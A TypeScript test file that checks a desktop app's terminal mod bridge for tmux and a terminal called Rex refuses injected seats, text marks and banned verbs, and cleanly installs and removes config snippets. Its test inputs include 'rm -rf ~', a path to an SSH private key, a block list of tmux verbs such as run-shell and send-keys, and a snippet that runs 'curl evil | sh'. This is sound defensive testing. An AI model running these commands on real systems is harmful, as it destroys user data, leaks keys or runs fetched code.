import { afterEach, describe, expect, test } from "bun:test";
import { lstatSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, readlinkSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { checkManifest } from "@kiwi/core/node/mod-manifest.ts";
import { UI_CONTRACT, UI_SURFACES } from "../desktop/src/ui-contract.ts";
import { markText, placedSeatsOf, seatId, statusFrame, terminalCalls, type Run, type TerminalDeps } from "../desktop/src/mods-terminal.ts";
import { installedHash, installSnippets, removeSnippets, snippetsOf, type SnippetHome } from "../desktop/src/mods-terminal-snippet.ts";
import { modsHost } from "../desktop/src/mods-host.ts";

const ROOM = "b6d383226365dd0ba576eff3d66f71a0";
const SOCKET = "/private/tmp/tmux-501/default";
const REX = { server: "unix:///tmp/rex.sock", session: "session:01a1b0d0-a2bc-7b13-9924-96cb4e9e8dbd", block: "block:01a1b285-6117-76a7-b49e-34f424899158" };
const listing = (rows: unknown[]) => JSON.stringify({ seats: rows });
const SEATS = listing([
  { room: ROOM, alias: "dev", agent: "ana", wake: "on", place: { tmux: { socket: SOCKET, pane: "%7" } }, pid: 101 },
  { room: ROOM, alias: "dev", agent: "bo", wake: "on", place: { tmux: { socket: SOCKET, pane: "%8" } }, pid: 102 },
  { room: ROOM, alias: "dev", agent: "cy", wake: "on", place: { rex: REX }, pid: 103 },
  { room: ROOM, alias: "dev", agent: "dee", wake: "on" },
]);
const ana = seatId(ROOM, "ana");
const bo = seatId(ROOM, "bo");
const cy = seatId(ROOM, "cy");

function fake(answers: (argv: readonly string[]) => { status?: number | null; stdout?: string; stderr?: string } = () => ({})) {
  const ran: string[][] = [];
  const wrote: [string, string][] = [];
  let fronted = 0;
  const run: Run = async (argv) => {
    ran.push([...argv]);
    const a = answers(argv);
    return { status: a.status === undefined ? 0 : a.status, stdout: a.stdout ?? "", stderr: a.stderr ?? "" };
  };
  const deps: TerminalDeps = {
    seats: async () => placedSeatsOf(SEATS),
    run,
    tmux: () => "/opt/homebrew/bin/tmux",
    rex: () => "/usr/local/bin/rex",
    write: (device, text) => {
      wrote.push([device, text]);
      return true;
    },
    front: async () => {
      fronted++;
    },
  };
  return { calls: terminalCalls(deps), ran, wrote, fronted: () => fronted };
}

const tmuxAnswers = (argv: readonly string[]) => {
  if (argv.includes("display-message")) return { stdout: "@3\n" };
  if (argv.includes("list-clients")) return { stdout: "100\t/dev/ttys001\n300\t/dev/ttys004\n" };
  if (argv.includes("com.superlogical.terminal.process")) return { stdout: JSON.stringify({ foreground: { pid: 103 } }) };
  if (argv[0] === "ps") return { stdout: "ttys006\n" };
  return {};
};

describe("the terminal need", () => {
  test("mod.json may ask for it, plain, with nothing after it", () => {
    const base = { name: "terminals", version: "1.0.0", shell: "^3.7", needs: ["terminal", "command", "message-action"] };
    expect(checkManifest(base, "terminals", UI_CONTRACT)).toEqual({ ok: true, manifest: base });
    expect(checkManifest({ ...base, needs: ["terminal:tmux"] }, "terminals", UI_CONTRACT).ok).toBe(false);
  });

  test("the bridge has three terminal calls, and none runs, types or reads", () => {
    const calls = (UI_SURFACES[UI_CONTRACT] ?? []).filter((c) => /terminal|tmux|rex|pane|shell|exec|sendKey|typeInto/i.test(c));
    expect(calls).toEqual(["kiwi.modTerminalFocus", "kiwi.modTerminalMark", "kiwi.modTerminals"]);
  });
});

describe("where this computer's agents sit", () => {
  test("only well-formed places come through, each seat named by an id that carries no path or pane", () => {
    const seats = placedSeatsOf(
      listing([
        ...JSON.parse(SEATS).seats,
        { room: ROOM, alias: "dev", agent: "evil", place: { tmux: { socket: "relative/sock", pane: "%1" } } },
        { room: ROOM, alias: "dev", agent: "evil2", place: { tmux: { socket: SOCKET, pane: "%1; rm -rf ~" } } },
        { room: ROOM, alias: "dev", agent: "evil3", place: { rex: { ...REX, block: "block:../../x" } } },
        { room: "not-a-room", alias: "dev", agent: "evil4", place: { tmux: { socket: SOCKET, pane: "%1" } } },
      ]),
    );
    expect(seats.map((s) => [s.agent, s.in, s.id])).toEqual([
      ["ana", "tmux", ana],
      ["bo", "tmux", bo],
      ["cy", "rex", cy],
    ]);
    expect(placedSeatsOf("kiwi: an older CLI's words")).toEqual([]);
  });

  test("the mod gets ids, channels and agents, never sockets, panes, blocks or pids", async () => {
    const { calls } = fake();
    const listed = await calls.list();
    expect(listed).toEqual([
      { id: ana, room: ROOM, channel: "dev", agent: "ana", in: "tmux" },
      { id: bo, room: ROOM, channel: "dev", agent: "bo", in: "tmux" },
      { id: cy, room: ROOM, channel: "dev", agent: "cy", in: "rex" },
    ]);
    expect(JSON.stringify(listed)).not.toMatch(/tmux-501|%7|block:|session:|10[123]/);
  });
});

describe("bringing an agent's terminal forward", () => {
  test("tmux selects its window and pane, then switches the latest client to it", async () => {
    const { calls, ran } = fake(tmuxAnswers);
    await calls.focus(ana);
    const tmux = ["/opt/homebrew/bin/tmux", "-u", "-S", SOCKET];
    expect(ran).toEqual([
      [...tmux, "display-message", "-p", "-t", "%7", "#{window_id}"],
      [...tmux, "select-window", "-t", "@3"],
      [...tmux, "select-pane", "-t", "%7"],
      [...tmux, "list-clients", "-F", "#{client_activity}\t#{client_name}"],
      [...tmux, "switch-client", "-c", "/dev/ttys004", "-t", "%7"],
    ]);
  });

  test("Rex focuses its block, selects its session in the app, and brings Rex forward", async () => {
    const { calls, ran, fronted } = fake(tmuxAnswers);
    await calls.focus(cy);
    const rex = ["/usr/local/bin/rex", "-S", REX.server, "--autostart=false"];
    expect(ran).toEqual([
      [...rex, "api", "call", "-s", REX.session, "session.focus_block", JSON.stringify({ block_id: REX.block })],
      [...rex, "do", "session.select", `session_id=${REX.session}`],
    ]);
    expect(fronted()).toBe(1);
  });

  test("a pane that's gone, or a server that isn't running, says so", async () => {
    await expect(fake(() => ({ status: 1, stderr: "can't find pane: %7" })).calls.focus(ana)).rejects.toThrow("that agent's tmux pane is gone");
    await expect(fake(() => ({ status: 1, stderr: "no server running on /private/tmp/tmux-501/default" })).calls.focus(ana)).rejects.toThrow("tmux server isn't running");
  });
});

describe("marking the agents that need you", () => {
  test("tmux shows one mark per window, summed over the agents in it, and clears it when none is left", async () => {
    const { calls, ran } = fake(tmuxAnswers);
    await calls.mark(ana, { asks: 1, tasks: [9] });
    await calls.mark(bo, { asks: 1, tasks: [7, 12, 15] });
    await calls.mark(ana, null);
    await calls.mark(bo, null);
    const sets = ran.filter((a) => a.includes("set-option")).map((a) => a.slice(4));
    expect(sets).toEqual([
      ["set-option", "-w", "-t", "@3", "@kiwi", "1? T9"],
      ["set-option", "-w", "-t", "@3", "@kiwi", "2? T7 T9 T12 +1"],
      ["set-option", "-w", "-t", "@3", "@kiwi", "1? T7 T12 T15"],
      ["set-option", "-wu", "-t", "@3", "@kiwi"],
    ]);
  });

  test("Rex gets a program status on the agent's own terminal, only while the agent is the program in its block", async () => {
    const { calls, wrote, ran } = fake(tmuxAnswers);
    await calls.mark(cy, { asks: 2, tasks: [] });
    await calls.mark(cy, null);
    expect(wrote).toEqual([
      ["/dev/ttys006", statusFrame(cy, { asks: 2, tasks: [] })],
      ["/dev/ttys006", statusFrame(cy, null)],
    ]);
    expect(wrote[0]![1]).toBe(`\x1b]7501;state=blocked:kind=question:app=kiwi:id=kiwi/${cy}:title=S2l3aQ==:msg=${Buffer.from("2 questions for you").toString("base64")}\x1b\\`);
    expect(ran.filter((a) => a[0] === "ps")).toEqual([
      ["ps", "-o", "tty=", "-p", "103"],
      ["ps", "-o", "tty=", "-p", "103"],
    ]);

    const other = fake((argv) => (argv.includes("com.superlogical.terminal.process") ? { stdout: JSON.stringify({ foreground: { pid: 999 } }) } : tmuxAnswers(argv)));
    await expect(other.calls.mark(cy, { asks: 1, tasks: [] })).rejects.toThrow("isn't the program in its Rex block now");
    expect(other.wrote).toEqual([]);
  });

  test("a mark is counts, never text: words, codes and extra fields are refused", async () => {
    const { calls, ran } = fake(tmuxAnswers);
    for (const mark of [{ asks: 1, text: "#(rm -rf ~)" }, { asks: "1" }, { tasks: ["T7"] }, { asks: -1 }, { asks: 1e6 }, "2?", [1]]) await expect(calls.mark(ana, mark)).rejects.toThrow(/a mark/);
    expect(ran).toEqual([]);
    expect(markText([{ asks: 0, tasks: [] }])).toBe("");
  });
});

describe("what a terminal mod can't do", () => {
  test("a seat it wasn't given, or a pane, path or command in place of one, is refused before anything runs", async () => {
    const { calls, ran, wrote } = fake(tmuxAnswers);
    for (const seat of ["%7", SOCKET, "rm -rf ~", "../../.ssh/id_ed25519", REX.block, "0000000000000000", 7, null, { id: ana }]) {
      await expect(calls.focus(seat)).rejects.toThrow();
      await expect(calls.mark(seat, { asks: 1, tasks: [] })).rejects.toThrow();
    }
    expect(ran).toEqual([]);
    expect(wrote).toEqual([]);
  });

  test("every call it can make runs only tmux's and Rex's focus, list and mark verbs: never a command, keys or a read of a pane", async () => {
    const { calls, ran } = fake(tmuxAnswers);
    await calls.list();
    for (const id of [ana, cy]) {
      await calls.focus(id);
      await calls.mark(id, { asks: 3, tasks: [1, 2] });
      await calls.mark(id, null);
    }
    const tmuxVerbs = new Set(ran.filter((a) => a[0]!.endsWith("/tmux")).map((a) => a[4]));
    expect([...tmuxVerbs].sort()).toEqual(["display-message", "list-clients", "select-pane", "select-window", "set-option", "switch-client"]);
    const rexVerbs = new Set(ran.filter((a) => a[0]!.endsWith("/rex")).map((a) => (a[4] === "api" ? a[8] : `${a[4]} ${a[5]}`)));
    expect([...rexVerbs].sort()).toEqual(["com.superlogical.terminal.process", "do session.select", "session.focus_block"]);
    const all = ran.flat().join("\n");
    for (const banned of [
      "send-keys",
      "paste-buffer",
      "set-buffer",
      "capture-pane",
      "pipe-pane",
      "run-shell",
      "if-shell",
      "respawn",
      "new-window",
      "split-window",
      "source-file",
      ".write",
      ".format",
      "block.event",
      "client.key",
      "#(",
    ])
      expect([banned, all.includes(banned)]).toEqual([banned, false]);
  });
});

const roots: string[] = [];
const stops: (() => void)[] = [];

afterEach(() => {
  for (const s of stops.splice(0)) s();
  for (const r of roots.splice(0)) rmSync(r, { recursive: true, force: true });
});

function home() {
  const root = mkdtempSync(join(tmpdir(), "kiwi-mod-terminal-"));
  roots.push(root);
  const at: SnippetHome = { copies: join(root, "data", "mod-terminals"), record: join(root, "data", "mod-terminals.json"), home: join(root, "home"), env: {} };
  mkdirSync(at.home, { recursive: true });
  const mod = join(root, "mods", "terminals");
  mkdirSync(join(mod, "terminal"), { recursive: true });
  writeFileSync(join(mod, "terminal", "tmux.conf"), 'set -ga window-status-format "#{?@kiwi, #{@kiwi},}"\n');
  writeFileSync(join(mod, "terminal", "rex.lua"), 'rex.action{ name = "kiwi_next", title = "Kiwi: next agent that needs me", run = function() end }\n');
  return { root, at, mod };
}

const tree = (dir: string): string[] =>
  readdirSync(dir, { withFileTypes: true, recursive: true })
    .map((d) => join(d.parentPath, d.name).slice(dir.length))
    .sort();

describe("a terminal mod's snippets", () => {
  test("Turn on shows each snippet and the one line it adds, loading a copy the app keeps", () => {
    const { at, mod } = home();
    const s = snippetsOf(mod, "terminals", at);
    expect(s.tmux).toEqual({ file: "~/.tmux.conf", line: `source-file -q "${at.copies}/terminals/tmux.conf" # Kiwi mod terminals`, text: 'set -ga window-status-format "#{?@kiwi, #{@kiwi},}"\n' });
    expect(s.rex?.file).toBe("~/.config/rex/init.lua");
    expect(s.rex?.line).toBe(`pcall(dofile, "${at.copies}/terminals/rex.lua") -- Kiwi mod terminals`);
  });

  test("installing adds exactly those lines and copies; removing leaves both files byte for byte as they were", () => {
    const { at, mod } = home();
    const conf = join(at.home, ".tmux.conf");
    const init = join(at.home, ".config", "rex", "init.lua");
    mkdirSync(join(at.home, ".config", "rex"), { recursive: true });
    writeFileSync(conf, "set -g mouse on\nbind r source-file ~/.tmux.conf");
    writeFileSync(init, "rex.bind{ key = 'cmd+k', action = 'palette' }\n");
    const before = { conf: readFileSync(conf), init: readFileSync(init), tree: tree(at.home) };
    const s = snippetsOf(mod, "terminals", at);
    installSnippets("terminals", s, at);
    expect(readFileSync(conf, "utf8")).toBe(`set -g mouse on\nbind r source-file ~/.tmux.conf\n${s.tmux!.line}\n`);
    expect(readFileSync(init, "utf8")).toBe(`rex.bind{ key = 'cmd+k', action = 'palette' }\n${s.rex!.line}\n`);
    expect(readFileSync(join(at.copies, "terminals", "tmux.conf"), "utf8")).toBe(s.tmux!.text);
    expect(tree(at.home)).toEqual(before.tree);
    expect(installedHash("terminals", at)).toBe(s.hash);
    expect(removeSnippets("terminals", at)).toBe(true);
    expect(readFileSync(conf)).toEqual(before.conf);
    expect(readFileSync(init)).toEqual(before.init);
    expect(tree(at.home)).toEqual(before.tree);
    expect(installedHash("terminals", at)).toBeNull();
    expect(readdirSync(at.copies)).toEqual([]);
  });

  test("a config it had to create goes away on removal, and a symlinked one stays a symlink", () => {
    const { root, at, mod } = home();
    installSnippets("terminals", snippetsOf(mod, "terminals", at), at);
    expect(readFileSync(join(at.home, ".config", "rex", "init.lua"), "utf8")).toContain("-- Kiwi mod terminals");
    removeSnippets("terminals", at);
    expect(tree(at.home)).toEqual(["/.config", "/.config/rex"]);

    const dotfiles = join(root, "dotfiles");
    mkdirSync(dotfiles);
    writeFileSync(join(dotfiles, "tmux.conf"), "set -g mouse on\n");
    symlinkSync(join(dotfiles, "tmux.conf"), join(at.home, ".tmux.conf"));
    installSnippets("terminals", snippetsOf(mod, "terminals", at), at);
    expect(lstatSync(join(at.home, ".tmux.conf")).isSymbolicLink()).toBe(true);
    expect(readFileSync(join(dotfiles, "tmux.conf"), "utf8")).toContain("# Kiwi mod terminals");
    removeSnippets("terminals", at);
    expect(readlinkSync(join(at.home, ".tmux.conf"))).toBe(join(dotfiles, "tmux.conf"));
    expect(readFileSync(join(dotfiles, "tmux.conf"), "utf8")).toBe("set -g mouse on\n");
  });

  test("an edit around our line keeps the person's edit and takes only our line out", () => {
    const { at, mod } = home();
    const conf = join(at.home, ".tmux.conf");
    writeFileSync(conf, "set -g mouse on\n");
    const s = snippetsOf(mod, "terminals", at);
    installSnippets("terminals", s, at);
    writeFileSync(conf, `${readFileSync(conf, "utf8")}set -g status-left "hi"\n`);
    removeSnippets("terminals", at);
    expect(readFileSync(conf, "utf8")).toBe('set -g mouse on\nset -g status-left "hi"\n');
  });

  test("a snippet that's too big, binary or not a plain file is refused", () => {
    const { at, mod } = home();
    writeFileSync(join(mod, "terminal", "tmux.conf"), "x".repeat(16_001));
    expect(() => snippetsOf(mod, "terminals", at)).toThrow("tmux.conf is over 16 KB");
    writeFileSync(join(mod, "terminal", "tmux.conf"), "set -g\x00 x\n");
    expect(() => snippetsOf(mod, "terminals", at)).toThrow("tmux.conf holds control characters");
    rmSync(join(mod, "terminal", "tmux.conf"));
    symlinkSync("/etc/hosts", join(mod, "terminal", "tmux.conf"));
    expect(() => snippetsOf(mod, "terminals", at)).toThrow("must be a plain file");
  });
});

describe("a terminal mod in the app", () => {
  test("Turn on installs its snippets, a changed snippet asks again, and removing the mod takes the lines out", async () => {
    const { root, at } = home();
    const folder = join(root, "kiwi-mods");
    const dir = join(folder, "terminals");
    mkdirSync(join(dir, "terminal"), { recursive: true });
    writeFileSync(join(dir, "mod.json"), JSON.stringify({ name: "terminals", version: "1.0.0", shell: "^3.7", needs: ["terminal", "command"] }));
    writeFileSync(join(dir, "index.tsx"), `import { command } from "@kiwi/mod"\ncommand({ id: "show", title: "Show agent", run: () => {} })\n`);
    writeFileSync(join(dir, "terminal", "tmux.conf"), "bind K choose-tree -Zw\n");
    const conf = join(at.home, ".tmux.conf");
    writeFileSync(conf, "set -g mouse on\n");
    const host = modsHost({ folder, approvals: join(root, "data", "mods.json"), contract: UI_CONTRACT, push: () => {}, terminal: at });
    stops.push(() => host.stop());
    await host.start();
    const asked = host.list()[0]!;
    expect(asked.state).toBe("asks");
    expect(asked.terminal?.tmux?.line).toBe(`source-file -q "${at.copies}/terminals/tmux.conf" # Kiwi mod terminals`);
    expect(asked.terminal?.rex).toBeUndefined();
    expect(readFileSync(conf, "utf8")).toBe("set -g mouse on\n");

    await host.approve("terminals", ["terminal", "command"]);
    expect(host.list()[0]!.state).toBe("on");
    expect(readFileSync(conf, "utf8")).toBe(`set -g mouse on\n${asked.terminal!.tmux!.line}\n`);

    writeFileSync(join(dir, "terminal", "tmux.conf"), 'bind K run-shell "curl evil | sh"\n');
    await host.rescan();
    const again = host.list()[0]!;
    expect(again.state).toBe("asks");
    expect(again.terminal?.tmux?.text).toBe('bind K run-shell "curl evil | sh"\n');
    expect(readFileSync(join(at.copies, "terminals", "tmux.conf"), "utf8")).toBe("bind K choose-tree -Zw\n");

    rmSync(dir, { recursive: true });
    await host.rescan();
    expect(host.list()).toEqual([]);
    expect(readFileSync(conf, "utf8")).toBe("set -g mouse on\n");
  });
});
